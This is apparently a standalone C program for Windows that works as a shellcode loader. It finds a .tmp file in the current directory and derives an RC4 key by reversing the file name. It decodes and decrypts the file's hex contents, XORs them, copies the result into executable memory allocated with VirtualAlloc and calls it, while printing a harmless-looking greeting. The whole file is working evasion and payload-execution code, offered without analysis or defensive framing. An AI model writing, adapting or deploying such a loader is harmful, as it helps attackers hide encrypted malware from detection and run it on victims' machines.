
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <memoryapi.h>
#include "rc4/rc4.h"

void reverse(char *str) {
    int len = strlen(str);
    for (int i = 0; i < len / 2; i++) {
        char temp = str[i];
        str[i] = str[len - i - 1];
        str[len - i - 1] = temp;
    }
}

size_t hex2bin(const char *hex, unsigned char **out) {
    size_t len;
    size_t i;
    unsigned char b;

    if (hex == NULL || out == NULL) {
        return 0;
    }

    len = strlen(hex);

    if (len % 2 != 0) {
        return 0;
    }

    *out = malloc(len / 2);
    if (*out == NULL) {
        return 0;
    }

    for (i = 0; i < len; i += 2) {
        if (hex[i] >= '0' && hex[i] <= '9') {
            b = hex[i] - '0';
        } else if (hex[i] >= 'A' && hex[i] <= 'F') {
            b = hex[i] - 'A' + 10;
        } else if (hex[i] >= 'a' && hex[i] <= 'f') {
            b = hex[i] - 'a' + 10;
        } else {
            return 0;
        }


        b = b << 4;


        if (hex[i + 1] >= '0' && hex[i + 1] <= '9') {
            b += hex[i + 1] - '0';
        } else if (hex[i + 1] >= 'A' && hex[i + 1] <= 'F') {
            b += hex[i + 1] - 'A' + 10;
        } else if (hex[i + 1] >= 'a' && hex[i + 1] <= 'f') {
            b += hex[i + 1] - 'a' + 10;
        } else {

            return 0;
        }


        (*out)[i / 2] = b;
    }


    return len / 2;
}

int main() {

    DIR *dir = opendir(".");
    if (dir == NULL) {
        perror("opendir");
        exit(1);
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        char *fileName = entry->d_name;

        if (strlen(fileName) >= 16 && strcmp(fileName + strlen(fileName) - 4, ".tmp") == 0) {
            printf("have a good day!\n");
            char *reversedKey = strdup(fileName);
            if (reversedKey == NULL) {
                perror("strdup");
                exit(1);
            }
            reversedKey[strlen(reversedKey) - 4] = '\0';
            reverse(reversedKey);

            FILE *file = fopen(fileName, "rb");
            if (file == NULL) {
                perror("fopen");
                exit(1);
            }

            fseek(file, 0, SEEK_END);
            long fileSize = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char *content = malloc(fileSize);
            if (content == NULL) {
                perror("malloc");
                exit(1);
            }
            if (fread(content, 1, fileSize, file) != fileSize) {
                perror("fread");
                exit(1);
            }
            fclose(file);

            unsigned char *binContent = NULL;
            size_t binSize = hex2bin((char *)content, &binContent);
            if (binSize == 0) {
                fprintf(stderr, "hex2bin failed\n");
                exit(1);
            }
            free(content);

            unsigned char *rc4Message = malloc(binSize);
            if (rc4Message == NULL) {
                perror("malloc");
                exit(1);
            }
            RC4_KEY key;
            RC4_set_key(&key, strlen(reversedKey), (unsigned char *)reversedKey);
            RC4(&key, binSize, binContent, rc4Message);
            free(binContent);

            unsigned char *message = malloc(fileSize / 2);
            if (message == NULL) {
                perror("malloc");
                exit(1);
            }
            for (int i = 0; i < fileSize / 2; i++) {
                message[i] = rc4Message[i] ^ 0xff;
            }
            free(rc4Message);

            void* exec = VirtualAlloc(0, fileSize / 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (exec == NULL) {
                perror("VirtualAlloc failed");
                free(message);
                exit(1);
            }

            memcpy(exec, message, fileSize / 2);
            free(message);

            ((void(*)())exec)();

            break;
        }
    }
    closedir(dir);
    return 0;
}


